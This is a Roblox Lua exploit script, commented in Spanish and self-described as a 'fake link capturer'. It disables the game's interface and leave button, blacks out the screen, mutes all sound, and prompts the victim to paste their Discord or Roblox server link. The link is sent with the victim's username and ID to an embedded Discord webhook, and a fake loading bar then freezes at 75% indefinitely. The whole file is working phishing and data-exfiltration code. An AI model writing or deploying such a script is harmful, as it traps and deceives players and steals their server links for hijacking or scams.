-- Fake link capturer - pantalla única, tapa iconos y no deja salir fácilmente
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local runService = game:GetService("RunService")
local starterGui = game:GetService("StarterGui")

-- Ocultar TODA la interfaz de Roblox (iconos, barra superior, botón de salir, etc.)
pcall(function()
    starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    starterGui:SetCore("TopbarEnabled", false)
    starterGui:SetCore("ChatActive", false)
    starterGui:SetCore("PlayerListVisible", false)
end)

-- Webhook con proxy
local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1476423859744931890/VuBXJW28Zvxm83E4SiefionIe4nzky9dp4BOHYGer5RvtqNaVXlmabk7o-BInMMFRrmR"

-- ScreenGui full screen (cubre absolutamente todo)
local sg = Instance.new("ScreenGui")
sg.IgnoreGuiInset = true
sg.DisplayOrder = 2147483647  -- Máximo posible
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
sg.ResetOnSpawn = false
sg.Parent = playerGui

-- Frame negro que tapa visualmente cualquier cosa que se cuele
local black = Instance.new("Frame", sg)
black.Size = UDim2.new(1, 0, 1, 0)
black.BackgroundColor3 = Color3.new(0, 0, 0)
black.BorderSizePixel = 0
black.ZIndex = 1000000  -- Muy alto para estar encima de casi todo

local label = Instance.new("TextLabel", sg)
label.Size = UDim2.new(0.9, 0, 0.2, 0)
label.Position = UDim2.new(0.05, 0, 0.25, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(220, 220, 255)
label.TextStrokeTransparency = 0.6
label.TextStrokeColor3 = Color3.new(0, 0, 0)
label.Font = Enum.Font.SourceSansBold
label.TextSize = 42
label.TextWrapped = true
label.Text = "Copia acá el link de tu server"
label.ZIndex = 1000001

local box = Instance.new("TextBox", sg)
box.Size = UDim2.new(0.8, 0, 0.12, 0)
box.Position = UDim2.new(0.1, 0, 0.45, 0)
box.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
box.BorderColor3 = Color3.fromRGB(100, 100, 180)
box.TextColor3 = Color3.new(1, 1, 1)
box.PlaceholderText = "https://discord.gg/xxxx o link de Roblox"
box.Text = ""
box.TextScaled = true
box.ClearTextOnFocus = false
box.Font = Enum.Font.SourceSans
box.TextSize = 28
box.ZIndex = 1000001

-- Botón visible de Enviar
local sendButton = Instance.new("TextButton", sg)
sendButton.Size = UDim2.new(0.5, 0, 0.1, 0)
sendButton.Position = UDim2.new(0.25, 0, 0.6, 0)
sendButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
sendButton.BorderColor3 = Color3.fromRGB(100, 100, 255)
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Font = Enum.Font.SourceSansBold
sendButton.TextSize = 32
sendButton.Text = "Enviar"
sendButton.ZIndex = 1000001

-- Barra de progreso (oculta al inicio)
local progressFrame = Instance.new("Frame", sg)
progressFrame.Size = UDim2.new(0.8, 0, 0.05, 0)
progressFrame.Position = UDim2.new(0.1, 0, 0.7, 0)
progressFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
progressFrame.BorderSizePixel = 0
progressFrame.Visible = false
progressFrame.ZIndex = 1000001

local progressBar = Instance.new("Frame", progressFrame)
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(100, 220, 255)
progressBar.BorderSizePixel = 0

local progressLabel = Instance.new("TextLabel", sg)
progressLabel.Size = UDim2.new(1, 0, 0.15, 0)
progressLabel.Position = UDim2.new(0, 0, 0.8, 0)
progressLabel.BackgroundTransparency = 1
progressLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
progressLabel.Font = Enum.Font.SourceSansBold
progressLabel.TextSize = 40
progressLabel.Text = ""
progressLabel.Visible = false
progressLabel.ZIndex = 1000001

-- Mute total y constante
local function muteAll()
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("Sound") then
            obj.Volume = 0
            obj.Playing = false
        end
    end
end
muteAll()
runService.Heartbeat:Connect(muteAll)

-- Enviar solo si hay texto
local function enviarLink()
    local texto = box.Text
    if texto == "" then return false end
    
    local payload = {
        ["content"] = "**Link capturado**",
        ["embeds"] = {{
            ["description"] = "Usuario: " .. player.Name .. " (" .. player.UserId .. ")\nLink: " .. texto .. "\nJuego: " .. game.PlaceId,
            ["color"] = 3447003
        }}
    }
    
    local http = request or syn.request or http_request or fluxus.request or getgenv().request
    if http then
        pcall(function()
            http({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode(payload)
            })
        end)
    end
    return true
end

-- Acción al presionar Enviar
local function onSubmit()
    if enviarLink() then
        label.Visible = false
        box.Visible = false
        sendButton.Visible = false
        
        progressFrame.Visible = true
        progressLabel.Visible = true
        progressLabel.Text = "Cargando..."
        
        spawn(function()
            local percent = 0
            while percent < 0.75 do
                percent = percent + 0.005  -- Más lento aún
                progressBar.Size = UDim2.new(percent, 0, 1, 0)
                progressLabel.Text = "Cargando... " .. math.floor(percent * 100) .. "%"
                wait(0.8)  -- Sube muy lento
            end
            -- Quedarse en 75% infinito
            local dots = ""
            while true do
                dots = dots == "...." and "" or dots .. "."
                progressLabel.Text = "Cargando... 75%" .. dots
                wait(0.5)
            end
        end)
    else
        -- Si está vacío, no hace nada (puedes poner un texto temporal si quieres)
        box.Text = ""
    end
end

sendButton.MouseButton1Click:Connect(onSubmit)
box.FocusLost:Connect(function(enter)
    if enter then onSubmit() end
end)
